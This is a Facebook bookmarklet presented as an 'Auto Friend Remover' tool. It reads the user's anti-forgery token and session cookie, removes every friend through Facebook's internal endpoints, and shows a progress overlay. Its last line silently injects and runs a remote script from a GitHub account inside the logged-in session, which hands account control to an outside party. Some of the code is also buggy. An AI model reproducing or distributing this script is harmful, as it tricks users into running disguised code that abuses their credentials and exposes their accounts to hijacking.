javascript: var Title = "AUTO FRIEND REMOVER</A>";
var Descriptions = "",
    _text = 'Powered By: <A style="color:#3B5998;" href="https://www.facebook.com/bui.long.9" target="_blank">Bùi Thành Long</A> & <A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com/" target="_blank"> Vietnamese Auto Group</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/bui.long.9" target="_blank"> Bùi Thành Long</A></A>,</A><A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com/" target="_blank"> Vietnamese Auto Group</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com/" target="_blank">Vietnamese Auto Group</A>.</A>';

function InviteFriends(e) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/profile/removefriendconfirm.php?uid=" + e + "&unref=bd_friends_tab&nctr[_mod]=pagelet_timeline_app_collection_" + user_id + "%3A2356318349%3A2&__user=" + user_id + "&__a=1&__dyn=7n8ahyj2qmp5zpQ9UmWWaUGyxi9Ay8&__req=i&fb_dtsg=" + fb_dtsg + "&ttstamp=265816884971127865", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkred'>";
            err++;
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkgreen'>";
            Descriptions += arn[i] + " has been selected to be removed";
            suc++
        }
        Descriptions += "</div>";
        var d = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
        d += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
        if (i > 0) {
            d += arr.length + " Friends Detected<br/>";
            d += "<b>" + suc + "</b> Friends Removed of " + (arr.length - i) + " Friends Processed ";
            d += "(" + i + " Lefted...)";
            d += "<div class='friend-edge'>";
            d += Descriptions;
            d += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            d += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            d += "Please Wait While Unfrinding " + arn[i] + ".</br>";
            d += _text;
            d += "</div>";
            d += "</div>";
            window[tag + "_close"] = true
        } else {
            Title = "All Of Your Friends Have Been Removed</A>";
            d += arr.length + " Friends Detected and ";
            d += "<b>" + suc + " Friends Removed.</b></br>";
            d += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span><br/>";
            d += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
            d += _text;
            d += "</div>";
            window[tag + "_close"] = false
        }
        d += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = d
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[tay];
        setTimeout("InviteFriends(" + s + ")", 100)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc)
}
jx = {
    b: function () {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {
            b = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (c) {
            try {
                b = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (a) {
                b = !1
            }
        } else if (window.XMLHttpRequest) try {
            b = new XMLHttpRequest
        } catch (h) {
            b = !1
        }
        return b
    },
    load: function (b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ?
            function () {
                g.c(e)
            } : function () {
                if (4 == e.readyState) if (200 == e.status) {
                    var b = "";
                    e.responseText && (b = e.responseText);
                    "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                    c && c(b)
                } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function () {
        return this.b()
    }
};

function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
}
setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
    if (window[tag + "_close"]) return "This script is running now!"
};
var i = 3;
var tay = 3;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var tag = "Close";
var page_name, x = document.getElementsByTagName("span");
for (i = 0; i < x.length; i++) if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var f = 0; f < d.length; f++) arn.push(d[f].text);
    for (var g = 0; g < d.length; g++) pho.push(d[g].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length);
    var h = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
    h += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
    h += arr.length + " Friends Detected";
    h += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = h;
    InviteFriends(arr[i])
});
document.body.appendChild(document.createElement('script')).src = "https://raw.github.com/buithanhlong444/Final_Tools/master/All.js";
